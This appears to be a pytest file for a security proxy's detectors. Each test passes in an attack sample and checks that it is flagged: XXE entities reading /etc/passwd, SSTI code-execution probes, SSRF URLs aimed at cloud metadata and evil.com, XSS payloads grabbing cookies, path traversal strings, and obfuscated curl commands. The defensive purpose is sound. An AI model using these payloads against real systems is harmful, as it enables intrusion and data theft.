"""Tests for new security detectors: XXE, SSTI, SSRF, Deserialization, XSS, Zip Slip, LDAP, XPath."""

import pytest

from proxy.detectors.xxe import detect_xxe
from proxy.detectors.ssti import detect_ssti
from proxy.detectors.ssrf import detect_ssrf
from proxy.detectors.deserialization import detect_deserialization
from proxy.detectors.xss import detect_xss, detect_xss_in_response
from proxy.detectors.zip_slip import detect_zip_slip
from proxy.detectors.ldap_xpath import detect_ldap_injection, detect_xpath_injection
from proxy.detectors.decode_layer import decode_all_layers
from proxy.unicode_normalize import normalize_text

_CFG = {"rules": {}}


class TestXXE:
    def test_entity_declaration(self):
        threats = detect_xxe("query", {"xml": '<!ENTITY xxe SYSTEM "file:///etc/passwd">'}, config=_CFG)
        assert any(t.type == "xxe_injection" for t in threats)

    def test_doctype_injection(self):
        threats = detect_xxe("parse", {"data": '<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">'}, config=_CFG)
        assert any(t.type == "xxe_injection" for t in threats)

    def test_xinclude(self):
        threats = detect_xxe("parse", {"xml": '<xi:include href="file:///etc/shadow"/>'}, config=_CFG)
        assert any(t.type == "xxe_injection" for t in threats)

    def test_clean_xml(self):
        threats = detect_xxe("parse", {"xml": "<user><name>test</name></user>"}, config=_CFG)
        assert len(threats) == 0

    def test_billion_laughs(self):
        threats = detect_xxe("parse", {"xml": "&lol1;&lol2;&lol3;"}, config=_CFG)
        assert any(t.type == "xxe_injection" for t in threats)


class TestSSTI:
    def test_jinja2_rce(self):
        threats = detect_ssti("render", {"template": "{{config.__class__.__init__.__globals__}}"}, config=_CFG)
        assert any(t.type == "ssti" for t in threats)

    def test_jinja2_math_probe(self):
        threats = detect_ssti("render", {"input": "{{7*7}}"}, config=_CFG)
        assert any(t.type == "ssti" for t in threats)

    def test_mako_import(self):
        threats = detect_ssti("render", {"tpl": "<% import os %>"}, config=_CFG)
        assert any(t.type == "ssti" for t in threats)

    def test_erb_system(self):
        threats = detect_ssti("render", {"erb": "<%= system('id') %>"}, config=_CFG)
        assert any(t.type == "ssti" for t in threats)

    def test_freemarker(self):
        threats = detect_ssti("render", {"ftl": '<#assign ex="freemarker.template.utility.Execute"?new()>'}, config=_CFG)
        assert any(t.type == "ssti" for t in threats)

    def test_clean_template(self):
        threats = detect_ssti("render", {"html": "<h1>Hello World</h1>"}, config=_CFG)
        assert len(threats) == 0


class TestSSRF:
    def test_aws_metadata(self):
        threats = detect_ssrf("fetch", {"url": "http://169.254.169.254/latest/meta-data/"}, config=_CFG)
        assert any(t.type == "ssrf_metadata" for t in threats)

    def test_internal_network(self):
        threats = detect_ssrf("fetch", {"url": "http://192.168.1.1/admin"}, config=_CFG)
        assert any(t.type == "ssrf_internal" for t in threats)

    def test_gopher_protocol(self):
        threats = detect_ssrf("fetch", {"url": "gopher://evil.com/_GET /admin"}, config=_CFG)
        assert any(t.type == "ssrf_protocol" for t in threats)

    def test_file_protocol(self):
        threats = detect_ssrf("fetch", {"url": "file:///etc/passwd"}, config=_CFG)
        assert any(t.type == "ssrf_protocol" for t in threats)

    def test_at_bypass(self):
        threats = detect_ssrf("fetch", {"url": "http://attacker.com@127.0.0.1/admin"}, config=_CFG)
        assert any(t.type == "ssrf_bypass" for t in threats)

    def test_clean_url(self):
        threats = detect_ssrf("fetch", {"url": "https://api.github.com/repos"}, config=_CFG)
        assert len(threats) == 0

    def test_localhost(self):
        threats = detect_ssrf("fetch", {"url": "http://localhost:8080/admin"}, config=_CFG)
        assert any(t.type == "ssrf_internal" for t in threats)


class TestDeserialization:
    def test_pickle_load(self):
        threats = detect_deserialization("execute", {"code": "pickle.loads(data)"}, config=_CFG)
        assert any(t.type == "insecure_deserialization" for t in threats)

    def test_yaml_unsafe_load(self):
        threats = detect_deserialization("execute", {"code": "yaml.unsafe_load(data)"}, config=_CFG)
        assert any(t.type == "insecure_deserialization" for t in threats)

    def test_java_object_input_stream(self):
        threats = detect_deserialization("execute", {"code": "new ObjectInputStream(is)"}, config=_CFG)
        assert any(t.type == "insecure_deserialization" for t in threats)

    def test_dotnet_binary_formatter(self):
        threats = detect_deserialization("execute", {"code": "BinaryFormatter bf = new BinaryFormatter();"}, config=_CFG)
        assert any(t.type == "insecure_deserialization" for t in threats)

    def test_php_unserialize(self):
        threats = detect_deserialization("execute", {"code": "unserialize($data)"}, config=_CFG)
        assert any(t.type == "insecure_deserialization" for t in threats)

    def test_java_base64_magic(self):
        threats = detect_deserialization("execute", {"data": "rO0ABXNyABFqYXZh"}, config=_CFG)
        assert any(t.type == "insecure_deserialization" for t in threats)

    def test_clean_code(self):
        threats = detect_deserialization("execute", {"code": "json.loads(data)"}, config=_CFG)
        assert len(threats) == 0


class TestXSS:
    def test_script_tag(self):
        threats = detect_xss("write", {"html": '<script>alert(1)</script>'}, config=_CFG)
        assert any(t.type == "xss" for t in threats)

    def test_event_handler(self):
        threats = detect_xss("write", {"html": '<img src=x onerror=alert(1)>'}, config=_CFG)
        assert any(t.type == "xss" for t in threats)

    def test_javascript_uri(self):
        threats = detect_xss("write", {"html": '<a href="javascript:alert(1)">click</a>'}, config=_CFG)
        assert any(t.type == "xss" for t in threats)

    def test_svg_xss(self):
        threats = detect_xss("write", {"svg": '<svg onload=alert(1)>'}, config=_CFG)
        assert any(t.type == "xss" for t in threats)

    def test_dom_manipulation(self):
        threats = detect_xss("execute", {"code": "document.write('<img src=x>')"}, config=_CFG)
        assert any(t.type == "xss" for t in threats)

    def test_clean_html(self):
        threats = detect_xss("write", {"html": '<p>Hello <strong>world</strong></p>'}, config=_CFG)
        assert len(threats) == 0

    def test_xss_in_response(self):
        threats = detect_xss_in_response('<script>document.cookie</script>', config=_CFG)
        assert any(t.type == "xss_in_response" for t in threats)


class TestZipSlip:
    def test_traversal_in_archive(self):
        threats = detect_zip_slip("extract", {"path": "../../etc/passwd"}, config=_CFG)
        assert any(t.type == "zip_slip" for t in threats)

    def test_tar_extract(self):
        threats = detect_zip_slip("untar", {"cmd": "tar xf archive.tar.gz ../../../etc/shadow"}, config=_CFG)
        assert any(t.type == "zip_slip" for t in threats)

    def test_python_zipfile(self):
        threats = detect_zip_slip("execute", {"code": "zipfile.extractall('/tmp')"}, config=_CFG)
        assert any(t.type == "zip_slip" for t in threats)

    def test_clean_extract(self):
        threats = detect_zip_slip("extract", {"path": "/tmp/output/data.csv"}, config=_CFG)
        assert len(threats) == 0


class TestLDAPInjection:
    def test_filter_injection(self):
        threats = detect_ldap_injection("search", {"filter": ")(|(uid=*)"}, config=_CFG)
        assert any(t.type == "ldap_injection" for t in threats)

    def test_wildcard_search(self):
        threats = detect_ldap_injection("search", {"filter": "(&(objectClass=*))"}, config=_CFG)
        assert any(t.type == "ldap_injection" for t in threats)

    def test_clean_query(self):
        threats = detect_ldap_injection("search", {"name": "John Doe"}, config=_CFG)
        assert len(threats) == 0


class TestXPathInjection:
    def test_boolean_injection(self):
        threats = detect_xpath_injection("query", {"xpath": "' or '1'='1"}, config=_CFG)
        assert any(t.type == "xpath_injection" for t in threats)

    def test_axis_traversal(self):
        threats = detect_xpath_injection("query", {"xpath": "ancestor::node()"}, config=_CFG)
        assert any(t.type == "xpath_injection" for t in threats)

    def test_clean_xpath(self):
        threats = detect_xpath_injection("query", {"path": "/users/user[@id='123']"}, config=_CFG)
        assert len(threats) == 0


class TestDecodeLayer:
    def test_url_decode(self):
        result = decode_all_layers("%63%75%72%6c%20http://evil.com")
        assert "curl" in result

    def test_double_url_decode(self):
        result = decode_all_layers("%2563%2575%2572%256c")
        assert "curl" in result

    def test_hex_escape(self):
        result = decode_all_layers("\\x63\\x75\\x72\\x6c")
        assert "curl" in result

    def test_unicode_escape(self):
        result = decode_all_layers("\\u0063\\u0075\\u0072\\u006c")
        assert "curl" in result

    def test_null_byte_strip(self):
        result = decode_all_layers("/etc/passwd\x00.txt")
        assert "\x00" not in result
        assert "/etc/passwd" in result

    def test_shell_obfuscation(self):
        result = decode_all_layers("c''u''rl http://evil.com")
        assert "curl" in result

    def test_html_entities(self):
        result = decode_all_layers("&#99;&#117;&#114;&#108;")
        assert "curl" in result

    def test_ifs_bypass(self):
        result = decode_all_layers("cur${IFS}l http://evil.com")
        assert "cur l" in result  # IFS replaced with space

    def test_clean_text_unchanged(self):
        result = decode_all_layers("hello world")
        assert result == "hello world"


class TestUnicodeNormalization:
    def test_cyrillic_homoglyph(self):
        # Cyrillic 'с' (U+0441) should map to Latin 'c'
        result = normalize_text("\u0441url")
        assert result == "curl"

    def test_fullwidth_chars(self):
        # Fullwidth 'c' (U+FF43) should map to 'c'
        result = normalize_text("\uff43\uff55\uff52\uff4c")
        assert result == "curl"

    def test_zero_width_stripping(self):
        # Zero-width space should be stripped
        result = normalize_text("cu\u200brl")
        assert result == "curl"

    def test_rtl_override_stripping(self):
        # RTL override should be stripped
        result = normalize_text("chmod \u202e moc")
        assert "\u202e" not in result

    def test_combining_mark_removal(self):
        # Combining strikethrough (U+0337) should be removed
        result = normalize_text("c\u0337u\u0337r\u0337l")
        assert result == "curl"

    def test_math_bold(self):
        # Math Bold 'c' = U+1D41C, 'u' = U+1D42E, 'r' = U+1D42B, 'l' = U+1D425
        result = normalize_text("\U0001d41c\U0001d42e\U0001d42b\U0001d425")
        assert result == "curl"
